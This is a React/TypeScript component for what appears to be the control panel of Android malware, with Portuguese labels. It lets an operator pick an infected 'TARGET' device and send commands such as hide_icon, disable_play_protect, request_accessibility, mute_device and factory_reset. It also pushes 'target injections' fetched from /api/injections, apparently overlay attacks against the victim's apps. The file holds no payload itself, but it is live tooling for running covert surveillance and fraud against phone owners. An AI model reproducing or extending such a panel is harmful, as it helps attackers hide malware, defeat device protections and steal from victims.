import { useState, useEffect } from "react";
import { useListCommands, useSendCommand, Device } from "@workspace/api-client-react";
import { useToast } from "@/hooks/use-toast";

interface CommandPanelProps {
  devices?: Device[];
  preselectedDeviceId?: number;
  height?: string | number;
}

const DANGER_COMMANDS = ["factory_reset", "reboot"];

export function CommandPanel({ devices = [], preselectedDeviceId, height }: CommandPanelProps) {
  const [selectedDeviceId, setSelectedDeviceId] = useState<string>(
    preselectedDeviceId ? String(preselectedDeviceId) : ""
  );
  const { data: commands, isLoading } = useListCommands();
  const sendCommand = useSendCommand();
  const { toast } = useToast();
  const [injections, setInjections] = useState<any[]>([]);
  const [selectedInjection, setSelectedInjection] = useState("");

  useEffect(() => {
    fetch("/api/injections", { credentials: "include" })
      .then(res => { if (res.ok) return res.json(); return []; })
      .then(data => setInjections(data || []))
      .catch(() => {});
  }, []);

  const handleCommand = (commandId: string, commandLabel: string) => {
    if (!selectedDeviceId) {
      toast({ title: "No device selected", description: "Select a target device first.", variant: "destructive" });
      return;
    }
    sendCommand.mutate(
      { data: { deviceId: parseInt(selectedDeviceId, 10), command: commandId } },
      {
        onSuccess: (result) => {
          toast({ title: `> ${commandLabel}`, description: result.message, className: "border-[#00ff00] bg-black text-[#00ff00] font-mono text-xs" });
        },
        onError: (error: any) => {
          toast({ title: "COMMAND FAILED", description: error.message ?? "Execution error", variant: "destructive" });
        },
      }
    );
  };

  const handleInjection = async (targetId: string) => {
    if (!selectedDeviceId || !targetId) return;
    try {
      const res = await fetch("/api/injections", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ deviceId: parseInt(selectedDeviceId, 10), targetId }),
        credentials: "include"
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || "Failed to inject");
      toast({ title: `> INJECTION SENT`, description: `Target ${targetId} injected`, className: "border-[#ffaa00] bg-black text-[#ffaa00] font-mono text-xs" });
    } catch (err: any) {
      toast({ title: "INJECTION FAILED", description: err.message, variant: "destructive" });
    } finally {
      setSelectedInjection("");
    }
  };

  // Separate commands into sections
  const sectionAKeys = ["request_accessibility", "hide_icon", "disable_play_protect", "mute_device", "restart_app"];
  
  const sectionACommands = commands?.filter(c => sectionAKeys.includes(c.id)) || [];
  const sectionCCommands = commands?.filter(c => !sectionAKeys.includes(c.id)) || [];

  const groupedInjections = injections.reduce((acc, inj) => {
    if (!acc[inj.category]) acc[inj.category] = [];
    acc[inj.category].push(inj);
    return acc;
  }, {} as Record<string, any[]>);

  return (
    <div className="panel" style={{ display: "flex", flexDirection: "column", height: height ?? "auto", overflow: "hidden" }}>
      <div className="panel-header" style={{ justifyContent: "space-between", flexShrink: 0 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
          <span>■</span>
          <span>COMMAND PANEL</span>
        </div>
        {devices.length > 0 && !preselectedDeviceId && (
          <select
            data-testid="command-device-select"
            value={selectedDeviceId}
            onChange={e => setSelectedDeviceId(e.target.value)}
            style={{
              background: "#000",
              border: "1px solid #333",
              color: "#00ff00",
              fontSize: 9,
              padding: "2px 4px",
              fontFamily: "'Courier New', monospace",
              cursor: "pointer",
              maxWidth: 120
            }}
          >
            <option value="">-- TARGET --</option>
            {devices.map(d => (
              <option key={d.id} value={String(d.id)}>
                {d.name} [{d.status.toUpperCase()}]
              </option>
            ))}
          </select>
        )}
      </div>

      <div style={{ display: "flex", flexDirection: "column", flex: 1, background: "#020202", overflowY: "auto", padding: 6, gap: 10 }}>
        
        {/* SECTION A */}
        <div>
          <div style={{ color: "#00ff00", fontSize: 10, fontWeight: "bold", borderBottom: "1px solid #111", marginBottom: 4, paddingBottom: 2 }}>&gt; COMANDOS REMOTOS</div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 4 }}>
            {!commands && isLoading ? (
              <div style={{ color: "#333", fontSize: 10, padding: 4 }}>&gt; loading commands<span className="blink">_</span></div>
            ) : (
              sectionACommands.map(cmd => (
                <button
                  key={cmd.id}
                  data-testid={`command-btn-${cmd.id}`}
                  className={`cmd-btn`}
                  onClick={() => handleCommand(cmd.id, cmd.label)}
                  disabled={!selectedDeviceId || sendCommand.isPending}
                  style={{ padding: "4px 6px", height: "auto" }}
                >
                  <span style={{ marginRight: 4 }}>&gt;</span>
                  <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-start", flex: 1, overflow: "hidden" }}>
                    <span style={{ fontWeight: "bold", fontSize: 9, letterSpacing: "0.05em", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", width: "100%" }}>{cmd.label.toUpperCase()}</span>
                  </div>
                </button>
              ))
            )}
          </div>
        </div>

        {/* SECTION B */}
        <div>
          <div style={{ color: "#ffaa00", fontSize: 10, fontWeight: "bold", borderBottom: "1px solid #111", marginBottom: 4, paddingBottom: 2 }}>&gt; INJECOES DE ALVO</div>
          <div style={{ display: "flex", gap: 4 }}>
            <select
              value={selectedInjection}
              onChange={e => {
                setSelectedInjection(e.target.value);
                if(e.target.value) handleInjection(e.target.value);
              }}
              disabled={!selectedDeviceId}
              style={{
                flex: 1,
                background: "#050505",
                border: "1px solid #333",
                color: "#ffaa00",
                fontSize: 10,
                padding: "4px",
                fontFamily: "'Courier New', monospace",
                cursor: "pointer",
              }}
            >
              <option value="">-- SELECIONE INJECAO --</option>
              {Object.keys(groupedInjections).map(category => (
                <optgroup key={category} label={category}>
                  {groupedInjections[category].map((inj: any) => (
                    <option key={inj.id} value={inj.id}>{inj.name}</option>
                  ))}
                </optgroup>
              ))}
            </select>
          </div>
        </div>

        {/* SECTION C */}
        <div>
          <div style={{ color: "#aaa", fontSize: 10, fontWeight: "bold", borderBottom: "1px solid #111", marginBottom: 4, paddingBottom: 2 }}>&gt; SISTEMA</div>
          <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
            {sectionCCommands.map(cmd => (
              <button
                key={cmd.id}
                data-testid={`command-btn-${cmd.id}`}
                className={`cmd-btn${DANGER_COMMANDS.includes(cmd.id) ? " danger" : ""}`}
                onClick={() => handleCommand(cmd.id, cmd.label)}
                disabled={!selectedDeviceId || sendCommand.isPending}
                style={{ padding: "3px 6px" }}
              >
                <span style={{ marginRight: 4, width: 10 }}>
                  {DANGER_COMMANDS.includes(cmd.id) ? "!" : ">"}
                </span>
                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-start" }}>
                  <span style={{ fontWeight: "bold", fontSize: 9, letterSpacing: "0.05em" }}>{cmd.label.toUpperCase()}</span>
                </div>
              </button>
            ))}
          </div>
        </div>

      </div>
    </div>
  );
}
